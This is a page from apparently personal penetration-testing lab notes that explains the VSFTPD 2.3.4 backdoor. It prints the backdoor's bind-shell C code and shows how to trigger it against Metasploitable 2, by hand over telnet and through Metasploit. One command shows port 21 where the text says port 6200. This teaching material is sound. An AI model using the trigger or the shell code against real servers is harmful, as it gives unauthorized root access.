<!DOCTYPE html>
<html class="no-js" lang="fr">
<head>
    <meta charset="utf-8" />
        <meta name="generator" content="Docutils 0.19: https://docutils.sourceforge.io/" />

    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="docsearch:name" content="Cyber Security" />
    <meta name="docsearch:package_type" content="" />
    <meta name="docsearch:release" content="" />
    <meta name="docsearch:version" content="" />
    
        <title>Exploiting vulnerabilities in practice &mdash; Documentation Cyber Security </title>
    
    <link rel="stylesheet" type="text/css" href="../../../../_static/dist/fontawesome.css" />
      <link rel="stylesheet" type="text/css" href="../../../../_static/dist/theme.css" />
      <link rel="stylesheet" type="text/css" href="../../../../_static/graphviz.css" />
            <link rel="index" title="Index" href="../../../../genindex.html" />
            <link rel="search" title="Recherche" href="../../../../search.html" />
            <link rel="top" title="Documentation Cyber Security " href="#" />
            <link rel="up" title="Exploitation" href="../Exploitation.html" />
            <link rel="next" title="Bypass Security" href="../BypassSec/BypassSec.html" />
            <link rel="prev" title="Transferring the exploit to the target host" href="../TransfertExploit/TransfertExploit.html" />
    </head>
<body>
    <header class="container-fluid bg-primary">
        <div class="container-fluid">
            <div class="navbar navbar-expand-lg navbar-dark font-weight-bold">
                    <a href="../../../../index.html"
                        title="logoGrenouilleTech"
                        class="logo navbar-brand"
                    >
                        <img src="../../../../_static/img/ColorLogoOpenHardware-noBackground.svg" width="500" height="400" alt="logoGrenouilleTech"
                            class="logo-img"
                        />
                        Cyber Security
                    </a>
                
                
                <button class="navbar-toggler btn btn-primary d-lg-none" type="button" data-toggle="collapse" data-target="#collapseSidebar" aria-expanded="false" aria-controls="collapseExample">
                    <span class="navbar-toggler-icon"></span>
                    <span class="sr-only">Menu</span>
                </button>
            </div>
        </div>
    </header>
    <div class="container-fluid">
        <div class="row">
            <aside class="col-12 col-lg-3 sidebar-container">
                <div id="collapseSidebar" class="collapse sticky-top d-lg-block pt-5 pr-lg-4">
<div id="searchbox" style="display: none" role="search">
  <h3 id="searchlabel">Recherche rapide</h3>
    <div class="searchformwrapper">
    <form class="search" action="../../../../search.html" method="get">
      <input type="text" name="q" aria-labelledby="searchlabel" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"/>
      <input type="submit" value="Go" />
    </form>
    </div>
</div>
<script>document.getElementById('searchbox').style.display = "block"</script><div class="site-toc">
    <nav class="toc mt-3" aria-label="Main menu">
        <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
<ul class="current">
<li class="toctree-l1 current"><a class="reference internal" href="../../../CyberSec.html">Cyber Security</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="../../../BlueTeam/BlueTeam.html">Blue Team</a><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../BlueTeam/DarkwebOps/DarkwebOps.html">Introduction to Darkweb Operations</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../BlueTeam/DarkwebOps/Introduction/Introduction.html">Introduction</a><ul class="simple">
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../../Distrib/Distrib.html">Cyber Security Distribution</a><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../Distrib/Kali/Kali.html">Kali</a></li>
</ul>
</li>
<li class="toctree-l2 current"><a class="reference internal" href="../../Pentest.html">The Pentest</a><ul class="current">
<li class="toctree-l3"><a class="reference internal" href="../../Scope/Scope.html">Objectives &amp; Scope</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../../Scope/blackGreyWhite/blackGreyWhite.html">Black, Grey &amp; White box penetration testing</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Scope/rules/rules.html">Rules of engagement &amp; Results</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../Enumeration/Enumeration.html">Enumeration</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../../Enumeration/PassiveEnum/PassiveEnum.html">Passive information gathering</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Enumeration/ActiveEnum/ActiveEnum.html">Active information gathering</a><ul>
<li class="toctree-l5"><a class="reference internal" href="../../Enumeration/ActiveEnum/NetEnum/NetEnum.html">Network Enumeration</a></li>
</ul>
</li>
<li class="toctree-l4"><a class="reference internal" href="../../Enumeration/OSINT/OSINT.html">OSInt</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../Vulnerability/Vulnerability.html">Vulnerability, identification and assesment</a><ul class="simple">
</ul>
</li>
<li class="toctree-l3 current"><a class="reference internal" href="../Exploitation.html">Exploitation</a><ul class="current">
<li class="toctree-l4"><a class="reference internal" href="../Exploit/Exploit.html">Exploit</a></li>
<li class="toctree-l4"><a class="reference internal" href="../TransfertExploit/TransfertExploit.html">Transferring the exploit to the target host</a></li>
<li class="toctree-l4 current"><a class="current reference internal" href="#">Exploiting vulnerabilities in practice</a></li>
<li class="toctree-l4"><a class="reference internal" href="../BypassSec/BypassSec.html">Bypass Security</a></li>
<li class="toctree-l4"><a class="reference internal" href="../PrivEsc/PrivEsc.html">Privilege Escalation</a></li>
<li class="toctree-l4"><a class="reference internal" href="../PrivEsc/PrivEsc.html#weblinks">Weblinks</a></li>
<li class="toctree-l4"><a class="reference internal" href="../PostExploit/PostExploit.html">Post Exploitation</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../../webSecurity/webSecurity.html">Web Security</a><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../webSecurity/bugBountyVDS/bugBountyVDS.html">Bug Bounty &amp; Vulnerability Disclosur Program (VDS)</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../webSecurity/webSecurityAcademy/webSecurityAcademy.html">Web Security Academy</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../webSecurity/webSecurityAcademy/serverSideVulnerabilities/serverSideVulnerabilities.html">Server-Side Vulnerabilities</a><ul>
<li class="toctree-l5"><a class="reference internal" href="../../../webSecurity/webSecurityAcademy/serverSideVulnerabilities/pathTraversal/pathTraversal.html">Path Traversal</a></li>
<li class="toctree-l5"><a class="reference internal" href="../../../webSecurity/webSecurityAcademy/serverSideVulnerabilities/accessControl/accessControl.html">Access Control</a></li>
<li class="toctree-l5"><a class="reference internal" href="../../../webSecurity/webSecurityAcademy/serverSideVulnerabilities/AuthenticationVuln/AuthenticationVuln.html">Authentication vulnerabilities</a></li>
<li class="toctree-l5"><a class="reference internal" href="../../../webSecurity/webSecurityAcademy/serverSideVulnerabilities/SSRF/SSRF.html">Server-side request forgery</a></li>
<li class="toctree-l5"><a class="reference internal" href="../../../webSecurity/webSecurityAcademy/serverSideVulnerabilities/fileUploadVuln/fileUploadVuln.html">File Upload Vulnerabilities</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../../Toolbox/Toolbox.html">Toolbox</a><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../Toolbox/BurpSuite/BurpSuite.html">BurpSuite</a><ul class="simple">
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../Toolbox/Certutil/Certutil.html">Certutil.exe</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../Toolbox/Gophish/Gophish.html">Gophish</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../Toolbox/Metasploit/Metasploit.html">Metasploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../Toolbox/Metasploit/Meterpreter/Meterpreter.html">Meterpreter</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../Toolbox/Metasploit/Msfvenom/Msfvenom.html">Msfvenom</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../Toolbox/Netcat/Netcat.html">Netcat</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../Toolbox/Netcat/ncWebServer/ncWebServer.html">Netcat - Web Server</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../Toolbox/Nmap/Nmap.html">Nmap</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../Toolbox/Nmap/hostDiscovery/hostDiscovery.html">Host Discovery</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../Toolbox/Nmap/nmapPortScan/nmapPortScan.html">Nmap Port Scanning Techniques</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../Toolbox/Nmap/Fingerprint/Fingerprint.html">Fingerprinting services and operating systems</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../Toolbox/Nmap/NmapScripEngine/NmapScripEngine.html">Namp Script Engine (NSE)</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../Toolbox/Nmap/outputData/outputData.html">Output Data to files</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../Toolbox/OsintTools/OsintTools.html">OSInt Tools</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../Toolbox/Owasp_ZAP/Owasp_ZAP.html">ZAP (owasp)</a><ul class="simple">
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../Toolbox/Powershell/Powershell.html">Powershell</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../Toolbox/Powershell/psFileTransfert/psFileTransfert.html">PowerShell - File Transfert</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../Toolbox/RTTool/RTTool.html">Red Team Tools</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../Toolbox/SystemCmd/SystemCmd.html">System commands</a><ul class="simple">
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../Toolbox/VBSript/VBSript.html">VBSript</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../Toolbox/wget/wget.html">wget</a></li>
</ul>
</li>
</ul>
</li>
</ul>

    </nav>
    <template data-toggle-item-template>
        <button class="btn btn-sm btn-link toctree-expand" type="button">
            <span class="sr-only">Toggle menu contents</span>
        </button>
    </template>
</div>
                    <div class="d-lg-none border-bottom">
                        
                    </div>
                </div>
            </aside>
            <div class="col-12 col-lg-9 pt-5">
                <header class="row align-items-baseline">
                    <div class="col">
                        <nav aria-label="breadcrumb">
    <ol class="breadcrumb m-0 p-0 bg-transparent">
        <li class="breadcrumb-item"><a href="../../../../index.html">Docs</a></li>
            <li class="breadcrumb-item"><a href="../../../CyberSec.html">Cyber Security</a></li>
            <li class="breadcrumb-item"><a href="../../Pentest.html">The Pentest</a></li>
            <li class="breadcrumb-item"><a href="../Exploitation.html">Exploitation</a></li>
        <li class="breadcrumb-item active" aria-current="page">Exploiting vulnerabilities in practice</li>
    </ol>
</nav>
                    </div>
                    <div class="col-sm-12 col-lg-auto mt-3 mt-lg-3">
                        <noscript>
                            <p>JavaScript is required to toggle light/dark mode..</p>
                        </noscript>
                        <button id="ahd-theme" class="btn btn-sm btn-light text-decoration-none" type="button">
                            <span class="dark-only"><i class="fas fa-sun"></i> Light mode</span>
                            <span class="light-only"><i class="fas fa-moon"></i> Dark mode</span>
                        </button>
    <a class="btn btn-sm btn-light text-decoration-none" href="https://github.com/ahdcreative/sphinx_ahd_theme/blob/main/docs/CyberSec/Pentest/Exploitation/ExploitVulnInPractice/ExploitVulnInPractice.rst" rel="nofollow">
        <span class="btn-icon"><span class="fab fa-github"></span></span>
        <span class="btn-text">Edit on GitHub</span>
    </a>
    <a class="btn btn-sm btn-light text-decoration-none" href="../../../../_sources/CyberSec/Pentest/Exploitation/ExploitVulnInPractice/ExploitVulnInPractice.rst.txt" rel="nofollow">
        <span class="btn-icon"><span class="fas fa-code"></span></span>
        <span class="btn-text">View source</span>
    </a>
                        
                    </div>
                </header>
                <div class="row" >
                    <div class="col-12">
                        <hr class="w-100 my-4">
                    </div>
                </div>
                <div class="row">
                    <div class="col-12 col-lg-9 order-last order-lg-first rst-content">
                        <main role="main">
<section id="exploiting-vulnerabilities-in-practice">
<h1><a class="toc-backref" href="#sommaire" role="doc-backlink">Exploiting vulnerabilities in practice</a><a class="headerlink" href="#exploiting-vulnerabilities-in-practice" title="Lien permanent vers cette rubrique">¶</a></h1>
<nav class="contents" id="sommaire">
<span id="index-0"></span><p class="topic-title">Sommaire</p>
<ul class="simple">
<li><p><a class="reference internal" href="#exploiting-vulnerabilities-in-practice" id="id3">Exploiting vulnerabilities in practice</a></p>
<ul>
<li><p><a class="reference internal" href="#exploiting-vsftpd-v2-3-4" id="id4">Exploiting VSFTPD v2.3.4</a></p>
<ul>
<li><p><a class="reference internal" href="#vsftpd-v2-3-4-vulnerable-source-code" id="id5">VSFTPD v2.3.4 vulnerable source code</a></p></li>
<li><p><a class="reference internal" href="#exploiting-vsftpd-v2-3-4-manually" id="id6">Exploiting VSFTPD v2.3.4 manually</a></p></li>
<li><p><a class="reference internal" href="#exploiting-vsftpd-v2-3-4-with-metasploit" id="id7">Exploiting VSFTPD v2.3.4 with Metasploit</a></p></li>
</ul>
</li>
<li><p><a class="reference internal" href="#weblinks" id="id8">Weblinks</a></p></li>
</ul>
</li>
</ul>
</nav>
<hr class="docutils" />
<section id="exploiting-vsftpd-v2-3-4">
<h2><a class="toc-backref" href="#sommaire" role="doc-backlink">Exploiting VSFTPD v2.3.4</a><a class="headerlink" href="#exploiting-vsftpd-v2-3-4" title="Lien permanent vers cette rubrique">¶</a></h2>
<section id="vsftpd-v2-3-4-vulnerable-source-code">
<h3><a class="toc-backref" href="#sommaire" role="doc-backlink">VSFTPD v2.3.4 vulnerable source code</a><a class="headerlink" href="#vsftpd-v2-3-4-vulnerable-source-code" title="Lien permanent vers cette rubrique">¶</a></h3>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p><strong>Liens Web</strong></p>
<ul class="simple">
<li><p><a class="reference external" href="https://pastebin.com/AetT9sS5">VSFTPD v2.3.4 (exploit from pastebin)</a> <a class="footnote-reference brackets" href="#id1" id="id2" role="doc-noteref"><span class="fn-bracket">[</span>1<span class="fn-bracket">]</span></a></p></li>
</ul>
</div>
</div></blockquote>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p>When we scroll through the exploit code we find the following code (lines 37 to 41)
validates the user input on the username:</p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">37</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="o">((</span>p_str-&gt;p_buf<span class="o">[</span>i<span class="o">]==</span>0x3a<span class="o">)</span>
<span class="linenos">38</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">(</span>p_str-&gt;p_buf<span class="o">[</span>i+1<span class="o">]==</span>0x29<span class="o">))</span>
<span class="linenos">39</span><span class="w"> </span><span class="o">{</span>
<span class="linenos">40</span><span class="w">   </span>vsf_sysutil_extra<span class="o">()</span><span class="p">;</span>
<span class="linenos">41</span><span class="w"> </span><span class="o">}</span>
</pre></div>
</div>
</div>
<div class="admonition important">
<p class="admonition-title">Important</p>
<p><strong>Hexadecimal to ASCII</strong></p>
<blockquote>
<div><ul class="simple">
<li><p>0x3a= :</p></li>
<li><p>0x29= )</p></li>
</ul>
</div></blockquote>
</div>
</div></blockquote>
<p>Line 37 and 38 checks for user input containing hexadecimal chars 0x3a followed by 0x29 which
together represent the smiley face « :) » characters. When the username contains both these characters
the ‘else if’ statement executes the vsf_sysutil_extra function.</p>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p><strong>vsf_sysutil_extra function</strong></p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="linenos">75</span> <span class="nb">int</span>
<span class="linenos">76</span> <span class="n">vsf_sysutil_extra</span><span class="p">(</span><span class="n">void</span><span class="p">)</span>
<span class="linenos">77</span> <span class="p">{</span>
<span class="linenos">78</span>     <span class="nb">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">rfd</span><span class="p">;</span>
<span class="linenos">79</span>     <span class="n">struct</span> <span class="n">sockaddr_in</span> <span class="n">sa</span><span class="p">;</span>
<span class="linenos">80</span>     <span class="k">if</span><span class="p">((</span><span class="n">fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
<span class="linenos">81</span>     <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="linenos">82</span>     <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">sa</span><span class="p">));</span>
<span class="linenos">83</span>     <span class="n">sa</span><span class="o">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
<span class="linenos">84</span>     <span class="n">sa</span><span class="o">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">6200</span><span class="p">);</span>
<span class="linenos">85</span>     <span class="n">sa</span><span class="o">.</span><span class="n">sin_addr</span><span class="o">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">INADDR_ANY</span><span class="p">;</span>
<span class="linenos">86</span>     <span class="k">if</span><span class="p">((</span><span class="n">bind</span><span class="p">(</span><span class="n">fd</span><span class="p">,(</span><span class="n">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span>
<span class="linenos">87</span>     <span class="n">sizeof</span><span class="p">(</span><span class="n">struct</span> <span class="n">sockaddr</span><span class="p">)))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="linenos">88</span>     <span class="k">if</span><span class="p">((</span><span class="n">listen</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">100</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="linenos">89</span>     <span class="k">for</span><span class="p">(;;)</span>
<span class="linenos">90</span>     <span class="p">{</span>
<span class="linenos">91</span>       <span class="n">rfd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="linenos">92</span>       <span class="n">close</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">close</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="n">close</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
<span class="linenos">93</span>       <span class="n">dup2</span><span class="p">(</span><span class="n">rfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="n">dup2</span><span class="p">(</span><span class="n">rfd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> <span class="n">dup2</span><span class="p">(</span><span class="n">rfd</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
<span class="linenos">94</span>       <span class="n">execl</span><span class="p">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="s2">&quot;sh&quot;</span><span class="p">,(</span><span class="n">char</span> <span class="o">*</span><span class="p">)</span><span class="mi">0</span><span class="p">);</span>
<span class="linenos">95</span>     <span class="p">}</span>
<span class="linenos">96</span> <span class="p">}</span>
</pre></div>
</div>
</div>
</div></blockquote>
<p>A socket is a way of connecting two network nodes together so they can communicate with each other.
The first socket is listening for an incoming connection while the second socket reaches out and
connects to the listening socket. The server forms the listening socket and the client the
connecting socket. With this in mind let’s have a look at the exploit code from line 79 and onwards.</p>
<p>The ‘struct sockaddr_in’ in line 79 is a code structure in C programming that defines a variable in
the socket code. In this case ‘struct sockaddr_in sa’ defines the internet address as ‘sa’. The
structure is defined by the sin_family which is set to the constant AF_INET (IPv4 address type) in
line 83, sin_port is set to 6200 in line 84 and the client address set to ‘any’ in line 85. The code
after that uses the structure to setup a bind socket and a listener process on the socket to listen
for incoming connections. Note that this code is run in the target server context, so the server
sets up the bind socket and listener which is used by the remote attacker for setting up a
connection. Line 94 provides a shell to anyone connecting to the server on port 6200.</p>
</section>
<section id="exploiting-vsftpd-v2-3-4-manually">
<h3><a class="toc-backref" href="#sommaire" role="doc-backlink">Exploiting VSFTPD v2.3.4 manually</a><a class="headerlink" href="#exploiting-vsftpd-v2-3-4-manually" title="Lien permanent vers cette rubrique">¶</a></h3>
<p>Now we will demonstrate exploiting the backdoor vulnerability manually by connecting to the VSFTPD
service and using a Smiley face as the username to authenticate.</p>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p>Enter the following command on your attack box:</p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>telnet<span class="w"> </span><span class="o">[</span>Metasploitable<span class="w"> </span>IP<span class="o">]</span><span class="w"> </span><span class="m">21</span>
<span class="linenos">2</span>
<span class="linenos">3</span><span class="w"> </span>USER<span class="w"> </span>user:<span class="o">)</span>
<span class="linenos">4</span><span class="w"> </span>PASS<span class="w"> </span>pass
</pre></div>
</div>
<p>Then use the escape character ^] (ctrl+]) or wait a few seconds.</p>
<a class="reference internal image-reference" href="../../../../_images/vsftpBackdoor.png"><img alt="../../../../_images/vsftpBackdoor.png" class="align-center" src="../../../../_images/vsftpBackdoor.png" style="width: 500px;" /></a>
<p>If we then fire up Nmap and scan for port 6200 we should see that the malicious code has
been executed and port 6200 is open:</p>
<a class="reference internal image-reference" href="../../../../_images/vsftpd_nmap.png"><img alt="../../../../_images/vsftpd_nmap.png" class="align-center" src="../../../../_images/vsftpd_nmap.png" style="width: 500px;" /></a>
<p>Let’s connect to port 6200 using telnet with the following command:</p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w">  </span>telnet<span class="w"> </span><span class="o">[</span>target<span class="w"> </span>host<span class="w"> </span>IP<span class="o">]</span><span class="w"> </span><span class="m">21</span>
</pre></div>
</div>
<p>If we enter the command id; we will see that the FTP service is running as root and we have
a root shell on Metasploitable 2.</p>
<a class="reference internal image-reference" href="../../../../_images/002-vsftpd-backdoor-002.jpg"><img alt="../../../../_images/002-vsftpd-backdoor-002.jpg" class="align-center" src="../../../../_images/002-vsftpd-backdoor-002.jpg" style="width: 500px;" /></a>
</div>
</div></blockquote>
</section>
<section id="exploiting-vsftpd-v2-3-4-with-metasploit">
<h3><a class="toc-backref" href="#sommaire" role="doc-backlink">Exploiting VSFTPD v2.3.4 with Metasploit</a><a class="headerlink" href="#exploiting-vsftpd-v2-3-4-with-metasploit" title="Lien permanent vers cette rubrique">¶</a></h3>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p>Open Metasploit</p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>sudo<span class="w"> </span>msfconsole
</pre></div>
</div>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>Search for the Exploit and select the one you want to use.</p>
<div class="highlight-inputLanguage notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span> Search vsftpd
</pre></div>
</div>
<a class="reference internal image-reference" href="../../../../_images/metasploitSearch_vsftp.png"><img alt="../../../../_images/metasploitSearch_vsftp.png" class="align-center" src="../../../../_images/metasploitSearch_vsftp.png" style="width: 500px;" /></a>
<div class="highlight-inputLanguage notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span> use 1
</pre></div>
</div>
<a class="reference internal image-reference" href="../../../../_images/metasploitUse_1.png"><img alt="../../../../_images/metasploitUse_1.png" class="align-center" src="../../../../_images/metasploitUse_1.png" style="width: 500px;" /></a>
</div>
</div></blockquote>
</section>
</section>
<hr class="docutils" />
<section id="weblinks">
<h2><a class="toc-backref" href="#sommaire" role="doc-backlink">Weblinks</a><a class="headerlink" href="#weblinks" title="Lien permanent vers cette rubrique">¶</a></h2>
<aside class="footnote-list brackets">
<aside class="footnote brackets" id="id1" role="note">
<span class="label"><span class="fn-bracket">[</span><a role="doc-backlink" href="#id2">1</a><span class="fn-bracket">]</span></span>
<p><a class="reference external" href="https://pastebin.com/AetT9sS5">https://pastebin.com/AetT9sS5</a></p>
</aside>
</aside>
</section>
</section>

</main>
                        <nav aria-label="Page navigation" class="py-4 my-5 clearfix font-weight-bold border-top">
    <a class="float-left" href="../TransfertExploit/TransfertExploit.html" title="Previous">
        <span aria-hidden="true">←&nbsp;</span>Transferring the exploit to the target host
    </a>
    <a class="float-right" href="../BypassSec/BypassSec.html" title="Next">
        Bypass Security <span aria-hidden="true">&nbsp;→</span>
    </a>
</nav>
                    </div>
                    
                    <nav class="col-12 col-lg-3 pb-4">
                        <div class="sticky-top toc page-toc" aria-labelledby="page-toc-heading">
                            <p class="font-weight-bold" id="page-toc-heading">Page contents</p>
                            <ul>
<li><a class="reference internal" href="#">Exploiting vulnerabilities in practice</a><ul>
<li><a class="reference internal" href="#exploiting-vsftpd-v2-3-4">Exploiting VSFTPD v2.3.4</a><ul>
<li><a class="reference internal" href="#vsftpd-v2-3-4-vulnerable-source-code">VSFTPD v2.3.4 vulnerable source code</a></li>
<li><a class="reference internal" href="#exploiting-vsftpd-v2-3-4-manually">Exploiting VSFTPD v2.3.4 manually</a></li>
<li><a class="reference internal" href="#exploiting-vsftpd-v2-3-4-with-metasploit">Exploiting VSFTPD v2.3.4 with Metasploit</a></li>
</ul>
</li>
<li><a class="reference internal" href="#weblinks">Weblinks</a></li>
</ul>
</li>
</ul>

                        </div>
                    </nav>
                    
                </div>
            </div>
        </div>
    </div>
    <footer class="container-fluid bg-primary text-light">
        <div class="container">
            <div class="row">
        <div class="col p-4">
            
            <div class="text-center">
                <p style="display: none">
                    <a class="text-light" href="https://github.com/ahdcreative/sphinx_ahd_theme" rel="nofollow" target="_blank">
                        AHDCreative Sphinx Theme 5.3.8
                    </a>
                </p>
            </div>
            <div class="text-center">
                    &copy; Copyright 2023, Poltergeist42
            </div>
        </div>
    </div>
        </div>
    </footer>
        <script data-url_root="../../../../" id="documentation_options" src="../../../../_static/documentation_options.js"></script>
        <script src="../../../../_static/jquery.js"></script>
        <script src="../../../../_static/underscore.js"></script>
        <script src="../../../../_static/_sphinx_javascript_frameworks_compat.js"></script>
        <script src="../../../../_static/doctools.js"></script>
        <script src="../../../../_static/sphinx_highlight.js"></script>
        <script src="../../../../_static/translations.js"></script>
        <script type="text/javascript" src="../../../../_static/dist/theme.js"></script>
        <script type="text/javascript" src="../../../../_static/dist/vendor.js"></script>
        <script type="text/javascript" src="../../../../_static/searchtools.js"></script>
        <script type="text/javascript" src="../../../../_static/language_data.js"></script>
        <script type="text/javascript">
            jQuery(function() { Search.loadIndex("../../../../searchindex.js"); });
        </script>
        <script type="text/javascript" id="searchindexloader"></script>
    </body>
</html>